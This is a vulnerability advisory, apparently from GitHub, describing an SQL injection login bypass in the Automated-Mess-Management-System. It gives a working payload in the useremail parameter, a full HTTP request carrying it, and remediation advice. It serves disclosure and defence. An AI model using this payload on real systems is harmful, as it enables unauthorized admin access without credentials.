# boyiddha / Automated-Mess-Management-System - SQL Injection Login

## Vendor Homepage:
[Automated-Mess-Management-System](https://github.com/boyiddha/Automated-Mess-Management-System)

## Impact
The SQL Injection vulnerability in the login functionality of the Automated-Mess-Management-System allows attackers to bypass authentication mechanisms and gain unauthorized access to the admin panel. By injecting malicious SQL queries, attackers can manipulate the login process to always return true, granting them elevated privileges without valid credentials.

## Proof of Concept
Step 1: Attempt to log in with a non-existing email address and a random password.\
Step 2: Intercept the login request and inject the following payload into the 'useremail' parameter: "`+or+1%3d1+%23+limit+1+%23". This payload exploits the SQL injection vulnerability by modifying the query to always return true, effectively bypassing the authentication process.\
Step 3: Submit the modified request and observe that the application redirects you to the admin panel without requiring valid credentials, granting unauthorized access.

## HTTP Request Example
``` http request
POST /index.php HTTP/1.1
Host: [REDACTED]
Content-Length: 71
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: [REDACTED]
Connection: close

userType=Admin&useremail='+or+1%3d1+%23+limit+1+%23&password=NoChizPlz&login=
```
## Proof with Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/6c3ed090-6e14-40a4-94ba-9ca5439aaeef)


## Remidiation
To mitigate this vulnerability, developers should implement proper input validation and parameterized queries to prevent SQL injection attacks. Additionally, enforcing the principle of least privilege by limiting the permissions of database users and implementing robust authentication mechanisms can help prevent unauthorized access to sensitive areas of the application.

## CWE
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
